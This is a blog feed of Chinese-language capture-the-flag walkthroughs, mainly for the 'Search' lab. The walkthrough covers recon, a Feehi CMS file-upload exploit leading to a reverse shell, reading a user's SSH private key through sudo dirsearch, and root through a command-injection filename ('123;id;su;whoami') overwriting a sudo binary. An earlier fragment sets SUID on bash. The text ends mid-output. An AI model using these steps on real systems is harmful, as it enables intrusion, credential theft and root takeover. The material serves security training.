class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = <span class="hljs-string">&quot;flag&quot;</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 2<br>[ <span class="hljs-variable">$1</span> = <span class="hljs-string">&quot;flag&quot;</span> ] &amp;&amp; <span class="hljs-built_in">chmod</span> +s /bin/bash <br></code></pre></td></tr></table></figure><p>执行脚本，使<code>/bin/bash</code>具有<code>suid</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">redbean@motto:~/.backup$  /opt/run_newsh <span class="hljs-string">&#x27;flag &#x27;</span><br><br>▓▒░ Loading system diagnostics ░▒▓<br><br>[INFO] Initializing environment checks:<br> ● Module A status: OK (ver 4.17.190)<br> ● Module B status: OK (ver 2.4.482)<br> ● Module C status: OK (ver 2.5.116)<br>Random seed value: 26001<br>[INFO] Evaluating input parameters...<br>[INFO] Running diagnostic sequence:<br> → Executing <span class="hljs-built_in">test</span> 1 of 3<br> → Executing <span class="hljs-built_in">test</span> 2 of 3<br> → Executing <span class="hljs-built_in">test</span> 3 of 3<br><br>Waiting period: 3 seconds<br>&gt;&gt; Countdown: 3<br>&gt;&gt; Waiting T-2 seconds...<br>&gt;&gt; Countdown: 1<br>&gt;&gt; Waiting T-0 seconds...<br>No errors detected.<br>Thank you <span class="hljs-keyword">for</span> using the system monitor.<br>[STATS] Summary Report:<br>    Processes checked: 74<br>/opt/new.sh: line 60: bc: <span class="hljs-built_in">command</span> not found<br>    CPU load average: <br>    Uptime (hours): 31<br></code></pre></td></tr></table></figure><p>查看<code>/bin/bash</code>属性，已经具有<code>suid</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">redbean@motto:~/.backup$ <span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash<br></code></pre></td></tr></table></figure><p>获取root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">redbean@motto:~/.backup$ /bin/bash -p<br>bash-5.0# <span class="hljs-built_in">id</span><br>uid=1000(redbean) gid=1000(redbean) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(redbean)<br>bash-5.0# <span class="hljs-built_in">whoami</span><br>root<br></code></pre></td></tr></table></figure><h1 id="六、获取FLAG"><a href="#六、获取FLAG" class="headerlink" title="六、获取FLAG"></a>六、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.0# <span class="hljs-built_in">cat</span> /home/redbean/user.txt /root/root.txt flag&#123;796f756765747265646265616e&#125; flag&#123;796f75676574726f6f74627574796f7563616e6e6f74676574686572&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackmyvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权-suid</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Search</title>
    <link href="/Maze-sec/Search/"/>
    <url>/Maze-sec/Search/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 11:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00017s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00014s latency).<br>MAC Address: 08:00:27:59:EA:A8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.26<br>Host is up (0.00047s latency).<br>MAC Address: 08:00:27:78:61:17 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.05 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.26</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.26                                 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 11:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.26<br>Host is up (0.00032s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:78:61:17 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.58 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.26<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 11:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.26<br>Host is up (0.00029s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>|_http-title: Feehi CMS<br>|_http-server-header: Apache/2.4.62 (Debian)<br>MAC Address: 08:00:27:78:61:17 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.66 seconds<br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.26                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-16 11:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.26<br>Host is up (0.00048s latency).<br>All 100 scanned ports on 192.168.2.26 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 59 closed udp ports (port-unreach), 41 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:78:61:17 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 57.00 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><p>访问80端口，发现是一个<code>Feehi CMS</code></p><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.26 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.26<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              bak,md,db,js,php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/index                (Status: 200) [Size: 80684]<br>/index.php            (Status: 200) [Size: 80676]<br>/uploads              (Status: 301) [Size: 314] [--&gt; http://192.168.2.26/uploads/]<br>/admin                (Status: 301) [Size: 312] [--&gt; http://192.168.2.26/admin/]<br>/static               (Status: 301) [Size: 313] [--&gt; http://192.168.2.26/static/]<br>/assets               (Status: 301) [Size: 313] [--&gt; http://192.168.2.26/assets/]<br>/php                  (Status: 200) [Size: 58255]<br>/java                 (Status: 200) [Size: 64546]<br>/install.php          (Status: 200) [Size: 94]<br>/api                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.26/api/]<br>/javascript           (Status: 200) [Size: 62968]<br>/Java                 (Status: 200) [Size: 64546]<br>/robots.txt           (Status: 200) [Size: 25]<br>/setup.txt            (Status: 200) [Size: 18]<br>/JavaScript           (Status: 200) [Size: 62968]<br>/PHP                  (Status: 200) [Size: 58255]<br>Progress: 44313 / 1764488 (2.51%)^C<br></code></pre></td></tr></table></figure><p>查看<code>setup.txt</code>，找到用户名和密码<code>admin:MazeSec2025</code></p><h1 id="三、Feehi-CMS漏洞利用"><a href="#三、Feehi-CMS漏洞利用" class="headerlink" title="三、Feehi CMS漏洞利用"></a>三、Feehi CMS漏洞利用</h1><p><a href="https://www.exploit-db.com/exploits/51018">https://www.exploit-db.com/exploits/51018</a></p><p>利用步骤：</p><ol><li><p>使用<code>admin</code>账号登录后台<code>http://ip/admin</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512162225851.png"></p></li><li><p>转到运营管理-广告管理<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512162227645.png"></p></li><li><p>创建新广告<br> <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512162228499.png"></p></li><li><p>上传扩展名为 jpg&#x2F;png 的 php 脚本，然后使用 Burp 将扩展名改回 php。<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512162230212.png"></p></li><li><p>访问shell，复制图像的链接，修改ip后进行访问<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202512162241627.png"></p></li></ol><h1 id="四、获取www-data权限"><a href="#四、获取www-data权限" class="headerlink" title="四、获取www-data权限"></a>四、获取www-data权限</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444 <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.26] 48214<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><h2 id="1、获取7r1umphk权限"><a href="#1、获取7r1umphk权限" class="headerlink" title="1、获取7r1umphk权限"></a>1、获取7r1umphk权限</h2><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Search:/tmp$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on Search:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User www-data may run the following commands on Search:<br>    (7r1umphk) NOPASSWD: /usr/local/bin/dirsearch<br></code></pre></td></tr></table></figure><p>可以无密码，以<code>7r1umphk</code>用户权限执行<code>/usr/local/bin/dirsearch</code></p><p><code>dirsearch</code>可以使用参数<code>-l</code>读取文件</p><p>先读取看看有没有<code>7r1umphk</code>的公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Search:/tmp$ <span class="hljs-built_in">sudo</span> -u 7r1umphk /usr/local/bin/dirsearch -l /home/7r1umphk/.ssh/authorized_keys<br><br>  _|. _ _  _  _  _ _|_    v0.4.3.post1<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /tmp/reports/_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH2uUbVOyxF8xzVaY+wqMcubDBUbS6Ri8priYyRiyZbI 7r1umphk@Search/_25-12-16_10-26-45.txt<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/usr/local/bin/dirsearch&quot;</span>, line 8, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    sys.exit(main())<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/dirsearch/dirsearch.py&quot;</span>, line 67, <span class="hljs-keyword">in</span> main<br>    Controller()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/dirsearch/lib/controller/controller.py&quot;</span>, line 79, <span class="hljs-keyword">in</span> __init__<br>    self.run()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/dirsearch/lib/controller/controller.py&quot;</span>, line 212, <span class="hljs-keyword">in</span> run<br>    self.set_target(url)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.9/dist-packages/dirsearch/lib/controller/controller.py&quot;</span>, line 289, <span class="hljs-keyword">in</span> set_target<br>    cred, parsed.netloc = parsed.netloc.split(<span class="hljs-string">&quot;@&quot;</span>)<br>AttributeError: can<span class="hljs-string">&#x27;t set attribute</span><br></code></pre></td></tr></table></figure><p>直接读取私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Search:/tmp$ <span class="hljs-built_in">sudo</span> -u 7r1umphk /usr/local/bin/dirsearch -l /home/7r1umphk/.ssh/id_ed25519     <br><br>  _|. _ _  _  _  _ _|_    v0.4.3.post1<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /tmp/reports/BATCH-25-12-16_10-28-21/BATCH.txt<br><br>Target: http://-----BEGIN OPENSSH PRIVATE KEY-----/<br><br>[10:28:21] Starting: <br><br>There was a problem <span class="hljs-keyword">in</span> the request to: http://-----BEGIN%20OPENSSH%20PRIVATE%20KEY-----/<br><br>Target: http://b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW/<br><br>[10:28:21] Starting: <br><br>There was a problem <span class="hljs-keyword">in</span> the request to: http://b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW/<br><br>Target: http://QyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyAAAAJg+y+ADPsvg/<br><br>[10:28:21] Starting: <br><br>There was a problem <span class="hljs-keyword">in</span> the request to: http://QyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyAAAAJg+y+ADPsvg/<br><br>Target: http://AwAAAAtzc2gtZWQyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyA/<br><br>[10:28:21] Starting: <br><br>There was a problem <span class="hljs-keyword">in</span> the request to: http://AwAAAAtzc2gtZWQyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyA/<br><br>Target: http://AAAECPxip0hGT4O48HAkEWglmNjSaDrr8tXi1W+inEP7eAS32uUbVOyxF8xzVaY+wqMcub/<br><br>[10:28:21] Starting: <br><br>There was a problem <span class="hljs-keyword">in</span> the request to: http://AAAECPxip0hGT4O48HAkEWglmNjSaDrr8tXi1W+inEP7eAS32uUbVOyxF8xzVaY+wqMcub/<br><br>Target: http://DBUbS6Ri8priYyRiyZbIAAAADzdyMXVtcGhrQFNlYXJjaAECAwQFBg==/<br><br>[10:28:21] Starting: <br><br>There was a problem <span class="hljs-keyword">in</span> the request to: http://DBUbS6Ri8priYyRiyZbIAAAADzdyMXVtcGhrQFNlYXJjaAECAwQFBg==/<br><br>Target: http://-----END OPENSSH PRIVATE KEY-----/<br><br>[10:28:21] Starting: <br><br>There was a problem <span class="hljs-keyword">in</span> the request to: http://-----END%20OPENSSH%20PRIVATE%20KEY-----/<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>直接使用ai，提取出私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br>QyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyAAAAJg+y+ADPsvg<br>AwAAAAtzc2gtZWQyNTUxOQAAACB9rlG1TssRfMc1WmPsKjHLmwwVG0ukYvKa4mMkYsmWyA<br>AAAECPxip0hGT4O48HAkEWglmNjSaDrr8tXi1W+inEP7eAS32uUbVOyxF8xzVaY+wqMcub<br>DBUbS6Ri8priYyRiyZbIAAAADzdyMXVtcGhrQFNlYXJjaAECAwQFBg==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh 7r1umphk@192.168.2.26 -i <span class="hljs-built_in">id</span><br>7r1umphk@Search:~$ <span class="hljs-built_in">id</span><br>uid=1000(7r1umphk) gid=1000(7r1umphk) <span class="hljs-built_in">groups</span>=1000(7r1umphk)<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">7r1umphk@Search:/tmp$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> 7r1umphk on Search:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User 7r1umphk may run the following commands on Search:<br>    (root) NOPASSWD: /usr/local/bin/dirsearch<br></code></pre></td></tr></table></figure><p>也是<code>dirsearch</code></p><h3 id="构造sudo-可执⾏命令提权"><a href="#构造sudo-可执⾏命令提权" class="headerlink" title="构造sudo+可执⾏命令提权"></a>构造sudo+可执⾏命令提权</h3><p>用sudo覆写掉dirsearch就好了，但还是那句话，必须要有命中才会有输出文件，这下去自己的kali上创建一个文件，然后开http服务就好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">touch</span> <span class="hljs-string">&#x27;123;id;su;whoami&#x27;</span><br><br>┌──(root㉿kali)-[/tmp]<br>└─# python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">7r1umphk@Search:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;123;id;su;whoami&#x27;</span> &gt; miao<br>7r1umphk@Search:/tmp$ <span class="hljs-built_in">sudo</span> dirsearch -u http://192.168.2.4 -w ./miao -o /usr/local/bin/dirsearch<br><br>  _|. _ _  _  _  _ _|_    v0.4.3.post1<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 1<br><br>Output File: /usr/local/bin/dirsearch<br><br>Target: http://192.168.2.4/<br><br>[10:58:00] Starting: <br>[10:58:00] 200 -    0B  - /123;<span class="hljs-built_in">id</span>;su;<span class="hljs-built_in">whoami</span><br><br>Task Completed<br></code></pre></td></tr></table></figure><p>查看<code>/usr/local/bin/dirsearch </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">7r1umphk@Search:/tmp$ <span class="hljs-built_in">cat</span> /usr/local/bin/dirsearch <br><span class="hljs-comment"># Dirsearch started Tue Dec 16 10:58:00 2025 as: /usr/local/bin/dirsearch -u http://192.168.2.4 -w ./miao -o /usr/local/bin/dirsearch</span><br><br>200     0B   http://192.168.2.4/123;<span class="hljs-built_in">id</span>;su;<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>直接执行<code>/usr/local/bin/dirsearch </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">7r1umphk@Search:/tmp$ <span class="hljs-built_in">sudo</span> /usr/local/bin/dirsearch <br>/usr/local/bin/dirsearch: 3: /usr/local/bin/dirsearch: 200: not found<br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@Search:/tmp# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) 